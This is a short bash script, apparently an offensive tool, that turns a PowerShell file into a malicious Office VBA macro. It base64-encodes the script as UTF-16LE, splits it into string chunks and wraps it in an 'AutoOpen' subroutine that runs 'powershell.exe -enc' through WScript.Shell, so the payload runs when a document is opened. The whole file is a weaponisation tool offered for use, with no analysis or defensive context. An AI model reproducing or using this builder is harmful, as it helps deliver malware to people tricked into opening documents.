#!/bin/bash
read -p "Feed it your PS file:" Feed

echo "$(<$Feed )" | iconv --to-code UTF-16LE | base64 -w 0 >> Code2
awk '{gsub(/.{130}/,"&\n")}1' Code2 >> Code3
sed 's/^/\& "/' Code3 >> F1
sed 's/$/" _/' F1 >> F2
sed '1s/.\(.*\)/\1/' F2 >> F3
sed '$ s/.$//' F3 >> F4
sed '$s/$/)/' F4 >> F5
sed '0,/"/s//CreateObject("WScript.Shell").Run ("powershell.exe -enc /' F5 >> F6
sed '$ a End Sub' F6 >> Ready
sed -i '1 i\Sub AutoOpen()' Ready
rm Code2 Code3 F1 F2 F3 F4 F5 F6
echo Done your macro should open with gedit
gedit Ready
rm Ready
